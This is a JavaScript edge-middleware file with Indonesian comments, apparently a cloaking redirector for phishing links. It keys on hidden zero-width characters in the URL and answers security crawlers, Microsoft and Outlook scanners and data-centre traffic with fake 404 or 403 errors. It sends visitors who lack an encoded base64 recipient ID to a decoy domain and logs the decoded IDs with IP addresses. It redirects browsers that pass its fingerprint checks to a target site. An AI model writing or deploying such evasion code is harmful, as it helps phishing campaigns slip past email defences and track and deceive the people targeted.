export default function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0] || req.ip || 'Unknown';
  
  // 1. DETEKSI KUNCI GAIB (ZWC)
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));

  // 2. LOGGING UNTUK AKSES TANPA ZWC (PATH POLOS)
  if (!hasZwc && url.pathname === '/') {
    const isLikelyBot = /bot|spider|crawler|scanner|microsoft|outlook|office/i.test(ua) || ua.length < 30;
    const label = isLikelyBot ? "⚠️ BOT SCANNING (NO ZWC)" : "👤 MANUAL ACCESS (NO ZWC)";
    
    console.log(`${label} | IP: ${ip} | UA: ${ua}`);
    return new Response('404 Not Found', { status: 404 });
  }

  // 3. BLOCK DATA CENTER & MICROSOFT (Filter untuk bot US yang lolos tadi)
  const botIsps = ['microsoft', 'azure', 'amazon', 'aws', 'google cloud', 'digitalocean', 'hetzner', 'ovh'];
  const isServerIp = botIsps.some(isp => ua.includes(isp));
  const isMicrosoftBot = req.headers.has('x-ms-useragent') || ua.includes('office') || ua.includes('microsoft');

  if (isServerIp || isMicrosoftBot) {
    console.log(`❌ BLOCKED BOT (DC/MS): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 4. FINGERPRINTING MANUSIA (Standar Browser)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua);

  // 5. VALIDASI AKHIR & LOGGING STATUS (Fingerprint)
  if (ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // -------------------------------------------------------------------------
  // 6. LOGIKA BARU: VERIFIKASI BASE64 (The "SIM" Check)
  // -------------------------------------------------------------------------
  // Mengambil data setelah tanda '?' (misal: ?SGVsbG8=)
  const base64Data = url.search.startsWith('?') ? url.search.substring(1) : '';

  if (!base64Data || base64Data.length < 4) {
    console.log(`❌ REJECTED: MISSING/INVALID BASE64 | IP=${ip}`);
    // Jika tidak ada base64, lempar ke domain utama saja (pura-pura normal)
    return Response.redirect('https://gate.centralzero.mx/', 302);
  }

  try {
    // Mencoba decode untuk memastikan ini Base64 yang valid
    const decoded = Buffer.from(base64Data, 'base64').toString('utf-8');
    console.log(`✅ VERIFIED USER: ${decoded} | IP=${ip}`);
  } catch (e) {
    console.log(`❌ REJECTED: CORRUPT BASE64 | IP=${ip}`);
    return new Response('Invalid Request', { status: 400 });
  }
  // -------------------------------------------------------------------------

  // 7. SUCCESS REDIRECT & LOG
  console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname} | DATA=${base64Data}`);
  
  const targetUrl = 'https://nusaindahrp.com/?dev';
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: { 'Content-Type': 'text/html' }
    }
  );
}
